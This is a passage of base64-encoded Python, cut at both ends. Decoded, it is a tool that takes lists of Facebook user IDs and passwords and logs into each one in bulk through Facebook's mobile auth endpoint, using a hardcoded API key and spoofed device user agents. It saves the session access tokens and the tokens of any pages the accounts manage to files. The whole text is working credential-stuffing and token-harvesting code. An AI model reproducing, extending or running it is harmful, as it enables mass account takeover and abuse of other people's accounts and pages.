lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkuanNvbigpCiAgICAgICAgCiAgICAgICAgcHJpbnQocmVzcG9uc2UpCiAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcmVzcG9uc2U6CiAgICAgICAgICAgIHRva2VuID0gcmVzcG9uc2VbJ2FjY2Vzc190b2tlbiddCgogICAgICAgICAgICB3aXRoIG9wZW4ocGF0aF9maWxlLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYie3VpZH18e3Rva2VufVxuIikKCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICBcMDMzWzMybVtTVUNDRVNTXVwwMzNbMG06IEV4dHJhY3RlZCBBY2NvdW50IOKUgOKUgOKUgOKUgOKUgD4ge3VpZH0uIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAgc3VjY2Vzc19jb3VudC5hcHBlbmQodWlkKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICBcMDMzWzMxbVtGQUlMRURdXDAzM1swbTogVE8gRVhUUkFDVCBBY2NvdW50IOKUgOKUgOKUgOKUgOKUgD4ge3VpZH0uIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszMW1bRVJST1JdXDAzM1swbSBFcnJvciBleHRyYWN0aW5nIGFjY291bnQ6IHt1aWR9LiBSZWFzb246IHtzdHIoZSl9XDAzM1swbVxuIikKCgpkZWYgcHJveihhY2NvdW50c19maWxlLCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlKToKICAgICIiIlByb2Nlc3MgdGhlIGFjY291bnRzIGFuZCBleHRyYWN0IHRva2VucyBjb25jdXJyZW50bHkuIiIiCiAgICBzdWNjZXNzX2NvdW50ID0gW10KCiAgICAjIExvYWQgZXhpc3RpbmcgdWlkcyBmcm9tIHRoZSBvdXRwdXQgZmlsZSB0byBhdm9pZCBkdXBsaWNhdGVzCiAgICBleGlzdGluZ191aWRzID0gc2V0KCkKICAgIGlmIG9zLnBhdGguZXhpc3RzKHRva2VuX291dHB1dF9wYXRoKToKICAgICAgICB3aXRoIG9wZW4odG9rZW5fb3V0cHV0X3BhdGgsICdyJykgYXMgZjoKICAgICAgICAgICAgZXhpc3RpbmdfdWlkcyA9IHtsaW5lLnNwbGl0KCd8JylbMF0gZm9yIGxpbmUgaW4gZi5yZWFkbGluZXMoKX0KCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGFjY291bnRzX2ZpbGUsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYWNjb3VudHMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIGFjY291bnRzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBhY2NvdW50cyBpZiAnfCcgaW4gbGluZS5zdHJpcCgpXQoKICAgICAgICBpZiBub3QgYWNjb3VudHM6CiAgICAgICAgICAgIHByaW50KGYiTm8gdmFsaWQgYWNjb3VudHMgZm91bmQgaW4ge2FjY291bnRzX2ZpbGV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIHRocmVhZC5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gW2V4ZWN1dG9yLnN1Ym1pdChiZ3JhcGgsIHVpZCwgcHcsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3VpZHMpCiAgICAgICAgICAgICAgICAgICAgICAgZm9yIHVpZCwgcHcgaW4gW2FjY291bnQuc3BsaXQoJ3wnKSBmb3IgYWNjb3VudCBpbiBhY2NvdW50c11dCgogICAgICAgICAgICBmb3IgZnV0dXJlIGluIGZ1dHVyZXM6CiAgICAgICAgICAgICAgICBmdXR1cmUucmVzdWx0KCkKCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludChmIiAgICAgXDAzM1sxOzM0bVtTVUNDRVNTXVwwMzNbMG06IHtsZW4oc3VjY2Vzc19jb3VudCl9IHtleHRyYWN0X3R5cGV9KHMpIHN1Y2Nlc3NmdWxseSBleHRyYWN0ZWQuIikKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQoKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludChmIkZpbGUgbm90IGZvdW5kOiB7YWNjb3VudHNfZmlsZX0iKQogICAgICAgIHJldHVybgoKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByYW5kb20KaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcyBhcyB0aHJlYWQKaW1wb3J0IG9zCmltcG9ydCBzdHJpbmcKCmZiYXYgPSBmJycne3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSwgOTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfScnJwpmYmJ2ID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExMSwgOTk5OTk5OTk5KSkKZmJydiA9ICcwJwpyYW5kb21fc2VlZCA9IHJhbmRvbS5SYW5kb20oKQphZGlkID0gJycuam9pbihyYW5kb21fc2VlZC5jaG9pY2VzKHN0cmluZy5oZXhkaWdpdHMsIGs9MTYpKQp1YV9iZ3JhcGggPSAnW0ZCQU4vRkI0QTtGQkFWLycgKyBzdHIocmFuZG9tLnJhbmRpbnQoNDksIDY2KSkgKyAnLjAuMC4nICsgc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDQ5KSkgKyBzdHIocmFuZG9tLnJhbmRpbnQoMTEsIDk5KSkgKyAnO0ZCQlYvJyArIHN0cihyYW5kb20ucmFuZGludCgxMTExMTExMSwgNzc3Nzc3NzcpKSArICc7JyArICdbRkJBTi9GQjRBO0ZCQVYvJyArIGZiYXYgKyAnO0ZCQlYvJyArIGZiYnYgKyAnO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTIxMDd9O0ZCTEMvZnJfRlI7RkJSVi8nICsgZmJydiArICc7RkJDUi9Pb3JlZG9vIFROO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL01BUi1MWDFNO0ZCU1YvOTtGQk9QLzE7RkJDQS9hcm02NC12OGE6XScKCmRlZiBsb2FkX2V4aXN0aW5nX3Rva2VucyhwYXRoX2ZpbGUpOgogICAgIiIiTG9hZCBleGlzdGluZyBhY2NvdW50cyBvciBwYWdlcyBmcm9tIHRoZSBvdXRwdXQgZmlsZS4iIiIKICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGhfZmlsZSk6CiAgICAgICAgd2l0aCBvcGVuKHBhdGhfZmlsZSwgJ3InKSBhcyBmOgogICAgICAgICAgICByZXR1cm4ge2xpbmUuc3BsaXQoJ3wnKVswXSBmb3IgbGluZSBpbiBmLnJlYWRsaW5lcygpfSAgIyBTZXQgb2YgZXhpc3RpbmcgdWlkcyBvciBwYWdlIGlkcwogICAgcmV0dXJuIHNldCgpCgpkZWYgYmdyYXBoX3BhZ2UodWlkLCBwdywgcGF0aF9maWxlLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3Rva2Vucyk6CiAgICBhY2Nlc3NUb2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInICAjIEV4YW1wbGUgdG9rZW4KICAgIAogICAgaWYgdWlkIGluIGV4aXN0aW5nX3Rva2VuczoKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KGYiICAgICB7d2hpdGV9QUNDT1VOVCDilIDilIDilIDilIDilIA+IHtyZWR9e3VpZH0ge2dyZWVufUFMUkVBRFkgRVhJU1RTIikKICAgICAgICByZXR1cm4KCiAgICBkYXRhID0gewogICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsCiAgICAgICAgJ2FwaV9rZXknOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzVG9rZW4KICAgIH0KCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpLmpzb24oKQogICAgICAgIAogICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHJlc3BvbnNlOgogICAgICAgICAgICB0b2tlbiA9IHJlc3BvbnNlWydhY2Nlc3NfdG9rZW4nXQoKICAgICAgICAgICAgIyBFeHRyYWN0IEZhY2Vib29rIFBhZ2VzIGFzc29jaWF0ZWQgd2l0aCB0aGUgYWNjb3VudCB0b2tlbgogICAgICAgICAgICBwYWdlcyA9IGV4dHJhY3RfZmJfcGFnZXModG9rZW4pCiAgICAgICAgICAgIGlmIHBhZ2VzOgogICAgICAgICAgICAgICAgZm9yIHBhZ2UgaW4gcGFnZXM6CiAgICAgICAgICAgICAgICAgICAgcGFnZV9pZCA9IHBhZ2VbJ2lkJ10KICAgICAgICAgICAgICAgICAgICBpZiBwYWdlX2lkIG5vdCBpbiBleGlzdGluZ190b2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoX2ZpbGUsICdhJykgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7cGFnZV9pZH18e3BhZ2VbJ2FjY2Vzc1Rva2VuJ119XG4iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSAg4pSA4pSA4pSA4pSA4pSAPiB7Z3JlZW59UGFnZSBJRDoge3JlZH17cGFnZV9pZH0ge3llbGxvd31FWFRSQUNURUQgU1VDQ0VTU0ZVTExZIikKICAgICAgICAgICAgICAgICAgICAgICAgZXhpc3RpbmdfdG9rZW5zLmFkZChwYWdlX2lkKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3doaXRlfUlEOiAge3BhZ2VfaWR9IOKUgOKUgOKUgOKUgOKUgD4ge2dyZWVufUFMUkVBRFkgRVhJU1RTICEgIikKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSDilIDilIDilIDilIDilIA+IHtyZWR9RE9FU04nVCBIQVZFIFBBR0VTICEiKQogICAgICAgICAgICAKICAgICAgICAgICAgc3VjY2Vzc19jb3VudC5hcHBlbmQodWlkKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie3doaXRlfXt1aWR9ICDilIDilIDilIDilIDilIA+IHtyZWR9RkFJTEVEIFRPIEVYVFJBQ1QgISAiKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIltFUlJPUl0gRXJyb3IgZXh0cmFjdGluZyBhY2NvdW50OiB7dWlkfS4gUmVhc29uOiB7c3RyKGUpfSIpCgpkZWYgZXh0cmFjdF9mYl9wYWdlcyh0b2tlbik6CiAgICB1cmwgPSAnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE4LjAvbWUvYWNjb3VudHMnCiAgICBoZWFkZXJzID0gewogICAgICAgICdBdXRob3JpemF0aW9uJzogZidCZWFyZXIge3Rva2VufScKICAgIH0KICAgIAogICAgcGFnZXNfZGF0YSA9IFtdCiAgICAKICAgIHdoaWxlIHVybDoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSAhPSAyMDA6CiAgICAgICAgICAgIHByaW50KGYnRXJyb3I6IHtyZXNwb25zZS50ZXh0fScpCiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgCiAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgIGZvciBwYWdlIGluIGRhdGEuZ2V0KCdkYXRhJywgW10pOgogICAgICAgICAgICBwYWdlc19kYXRhLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAnaWQnOiBwYWdlLmdldCgnaWQnKSwKICAgICAgICAgICAgICAgICdhY2Nlc3NUb2tlbic6IHBhZ2UuZ2V0KCdhY2Nlc3NfdG9rZW4nKQogICAgICAgICAgICB9KQogICAgICAgIAogICAgICAgIHVybCA9IGRhdGEuZ2V0KCdwYWdpbmcnLCB7fSkuZ2V0KCduZXh0JykgICMgVXBkYXRlIHRoZSBVUkwgZm9yIHRoZSBuZXh0IHJlcXVlc3QKCiAgICByZXR1cm4gcGFnZXNfZGF0YQoKZGVmIHByb3pjKGFjY291bnRzX2ZpbGUsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUpOgogICAgc3VjY2Vzc19jb3VudCA9IFtdCiAgICBleGlzdGluZ190b2tlbnMgPSBsb2FkX2V4aXN0aW5nX3Rva2Vucyh0b2tlbl9vdXRwdXRfcGF0aCkKCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGFjY291bnRzX2ZpbGUsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYWNjb3VudHMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIGFjY291bnRzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBhY2NvdW50cyBpZiAnfCcgaW4gbGluZS5zdHJpcCgpXQoKICAgICAgICBpZiBub3QgYWNjb3VudHM6CiAgICAgICAgICAgIHByaW50KGYiTm8gdmFsaWQgYWNjb3VudHMgZm91bmQgaW4ge2FjY291bnRzX2ZpbGV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIHRocmVhZC5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gW2V4ZWN1dG9yLnN1Ym1pdChiZ3JhcGhfcGFnZSwgdWlkLCBwdywgdG9rZW5fb3V0cHV0X3BhdGgsIGV4dHJhY3RfdHlwZSwgc3VjY2Vzc19jb3VudCwgZXhpc3RpbmdfdG9rZW5zKQogICAgICAgICAgICAgICAgICAgICAgIGZvciB1aWQsIHB3IGluIFthY2NvdW50LnNwbGl0KCd8JykgZm9yIGFjY291bnQgaW4gYWNjb3VudHNdXQoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBmdXR1cmVzOgogICAgICAgICAgICAgICAgZnV0dXJlLnJlc3VsdCgpCgogICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszNG1bU1VDQ0VTU11cMDMzWzBtOiB7bGVuKHN1Y2Nlc3NfY291bnQpfSB7ZXh0cmFjdF90eXBlfShzKSBzdWNjZXNzZnVsbHkgZXh0cmFjdGVkLiIpCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoZiJGaWxlIG5vdCBmb3VuZDoge2FjY291bnRzX2ZpbGV9IikKZGVmIGV4dHJhY3Rpb24oKToKCiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIgICAgIHt3aGl0ZX1bMV0ge3llbGxvd31FWFRSQUNUIHtyZWR9QUNDT1VOVCIpCiAgICBwcmludChmIiAgICAge3doaXRlfVsyXSB7eWVsbG93fUVYVFJBQ1Qge3JlZH1QQUdFUyIpCiAgICBwcmludCgiICAgICBcMDMzWzE7MTRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBjaG9pY2UgPSBpbnB1dChmIiAgICAge2dyZWVufUNIT0lDRSA6ICIpLnN0cmlwKCkgCiAgICBpZiBjaG9pY2UgPT0gJzEnOgogICAgICAgIGF4bDEoKQogICAgZWxpZiBjaG9pY2UgPT0gJzInOgogICAgICAgIGF4bDIoKQogICAgZWxzZToKICAgICAgICBwcmludChmIiAgICAge3JlZH1JTlZBTElEIENIT0lDRSIpCmRlZiBheGwyKCk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgZm9sZGVyX3BhdGggPSAiL3NkY2FyZC9ib29zdHBoZXJlIiAgCiAgICBwcmludChmIiAgICBcMDMzWzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAxXSBcMDMzWzMybUZSQSBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAyXSBcMDMzWzMybUZSQSBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgICBcMDMzWzMxbVswM10gXDAzM1szMm1SUFcgRVhUUkFDVCBBQ0NPVU5UIikKICAgIHByaW50KGYiICAgICBcMDMzWzMxbVswNF0gXDAzM1szMm1SUFcgRVhUUkFDVCBQQUdFUyIpCiAgICBwcmludChmIiAgICBcMDMzWzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgc2F2ZV9jaG9pY2UgPSBpbnB1dChmIiAgICAgXDAzM1szMm1DSE9JQ0U6ICIpLnN0cmlwKCkKCiAgICBpZiBzYXZlX2Nob2ljZSA9PSAnMSc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiRlJBQUNDT1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMic6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiRlJBUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsaWYgc2F2ZV9jaG9pY2UgPT0gJzMnOgogICAgICAgIGFjY291bnRfZmlsZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgIlJQV0FDQ09VTlQudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAnYWNjb3VudCcKICAgIGVsaWYgc2F2ZV9jaG9pY2UgPT0gJzQnOgogICAgICAgIGFjY291bnRfZmlsZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgIlJQV1BBR0VTLnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ3BhZ2UnCiAgICBlbHNlOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gRXhpdGluZy4iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szM21USEUgRk9STUFUIFNIT1VMRCBCRSBcMDMzWzMxbXVpZHxwYXNzIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBmaWxlX3BhdGggPSBpbnB1dChmIiAgICAgXDAzM1szM21QQVRIOiAiKS5zdHJpcCgpCgogICAgcHJvemMoZmlsZV9wYXRoLCBhY2NvdW50X2ZpbGUsIGV4dHJhY3RfdHlwZSkKZGVmIGF4bDEoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBmb2xkZXJfcGF0aCA9ICIvc2RjYXJkL2Jvb3N0cGhlcmUiCiAgICBwcmludChmIiAgICBcMDMzWzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAxXSBcMDMzWzMybUZSQSBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAyXSBcMDMzWzMybUZSQSBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgICBcMDMzWzMxbVswM10gXDAzM1szMm1SUFcgRVhUUkFDVCBBQ0NPVU5UIikKICAgIHByaW50KGYiICAgICBcMDMzWzMxbVswNF0gXDAzM1szMm1SUFcgRVhUUkFDVCBQQUdFUyIpCiAgICBwcmludChmIiAgICBcMDMzWzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgc2F2ZV9jaG9pY2UgPSBpbnB1dChmIiAgICAgXDAzM1szMm1DSE9JQ0U6ICIpLnN0cmlwKCkKCiAgICBpZiBzYXZlX2Nob2ljZSA9PSAnMSc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiRlJBQUNDT